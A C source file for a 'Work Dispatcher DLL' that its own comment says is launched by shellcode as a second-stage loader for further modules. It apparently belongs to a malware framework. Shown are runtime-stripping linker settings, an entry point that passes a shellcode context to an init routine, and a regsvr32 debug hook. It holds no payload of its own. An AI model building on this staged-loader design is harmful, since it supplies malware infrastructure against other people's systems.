/*
	wdd.c
	Work Dispatcher DLL
	Executed by some binary or shellcode on second run stage. Establishes core module functionality,
	loads all other modules specified at DllEntry param

*/


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")

#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
	#define TARGET_ARCH ARCH_TYPE_X64
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
	#define TARGET_ARCH ARCH_TYPE_X32
#else
	#error Unknown target CPU, no system libs can be found
#endif

#include <windows.h>

#include "..\inc\mem.h"
#include "..\inc\dbg.h"
//#include "..\inc\CryptoStrings.h"

#include "..\inc\WorkDispatcher.h"

#include "..\shared\config.h"








#include "wdd.h"



// entrypoint function for service exe 
BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	BOOL bRes = TRUE;

	if (fdwReason == DLL_PROCESS_ATTACH) {

		DbgPrint("DLL_PROCESS_ATTACH: entered");

		// do init and return right back
		WorkDispatcherInit((SHELLCODE_CONTEXT *)lpvReserved);

//#ifdef _DEBUG
//		memPrintAllocationListDialog(0x1);
//#endif	

		DbgPrint("DLL_PROCESS_ATTACH: done");

	}	// DLL_PROCESS_ATTACH

	return bRes;
}





#ifdef _DEBUG

// entrypoint to be caller from regsvr32 for debugging

__declspec(dllexport) HRESULT __stdcall DllRegisterServer(void)
{
	DbgPrint("entered dbg mode");

//	DllEntry(NULL, DLL_PROCESS_ATTACH, NULL);

	DbgPrint("finished");

	Sleep(INFINITE);

	return S_OK;
}

#endif
